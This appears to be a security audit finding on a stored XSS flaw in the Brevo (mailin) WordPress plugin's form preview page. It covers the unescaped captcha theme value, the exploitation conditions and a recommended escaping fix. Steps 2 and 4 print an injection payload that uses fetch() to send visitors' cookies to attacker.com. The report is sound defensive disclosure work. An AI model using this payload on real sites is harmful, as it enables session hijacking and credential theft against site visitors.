title: Stored XSS via JavaScript Injection in Turnstile Captcha Theme Parameter on Unauthenticated Form Preview Page
description: The Brevo (mailin) WordPress plugin echoes the stored `cCaptchaStyle` form setting directly inside an inline `<script>` block on the form preview page without any JavaScript-context escaping. The value is stored in the plugin's custom database table when an administrator saves a subscription form, with only `sanitize_text_field()` applied — which strips HTML tags but preserves all JavaScript-injection-relevant characters (double quotes, semicolons, parentheses, commas). The preview URL (`/?sib_form=<id>`) is rendered by `sib_parse_request()` hooked to `parse_request`, with no authentication check or nonce verification, making it accessible to unauthenticated visitors.

attack_scenario.victim: Any user (including unauthenticated visitors) who browses the form preview URL
steps: 1. Attacker gains WordPress administrator access (e.g., compromised admin credentials, malicious plugin scenario, or insider threat).

2. Attacker navigates to the Brevo plugin's form editor and saves a subscription form with a crafted `turnstile_captcha_theme` value, e.g.: light",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:"
3. The value passes sanitize_text_field() validation (no HTML tags stripped, JS-special chars preserved) and is stored in the `mailin_forms` database table's `cCaptchaStyle` column.

4. Any unauthenticated user visiting /?sib_form=<form_id> receives a page where the injected value is rendered inside a <script> block as: theme: light",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:",
5. The injected JavaScript executes in the visitor's browser, enabling session hijacking, credential theft, or further exploitation.

vulnerable_code.context: Inside <script type="text/javascript"> block, inside turnstile.render() call. $cCaptchaStyle comes from $formData['cCaptchaStyle'] read via SIB_Forms::getForm($sib_form_id) at line 17.

write_path.sanitizer: sanitize_text_field() — strips HTML/PHP tags but NOT JavaScript-context special characters

conditions_for_exploitation.special_config_required: Turnstile captcha must be enabled on the target form (selectCaptchaType == 3 and gCaptcha != 0), otherwise the vulnerable code path at line 74 is not reached
conditions_for_exploitation.user_interaction_required: Victim must visit the preview URL (link delivery via email, social engineering, etc.)

fix_recommendation: Replace `echo $cCaptchaStyle;` at sib-form-preview.php:74 with `echo esc_js($cCaptchaStyle);` or, better, `echo json_encode($cCaptchaStyle);` to ensure the value is properly quoted and escaped for a JavaScript string context. Additionally, consider restricting access to the preview page to logged-in users with sufficient capability (e.g., `manage_options`) by adding a `current_user_can()` check in `sib_parse_request()`.
notes: The form preview page is intentionally accessible without authentication to allow designers/marketers to preview forms without login. This design decision amplifies the impact of any injection in the preview rendering code.
The three push-admin XSS flows (mailin-xss-002/003/004) flagged by the automated scanner are false positives — they reflect only hardcoded constant strings from ternary expressions.
The SSRF finding (mailin-ssrf-001) is a false positive — the URL is hardcoded.
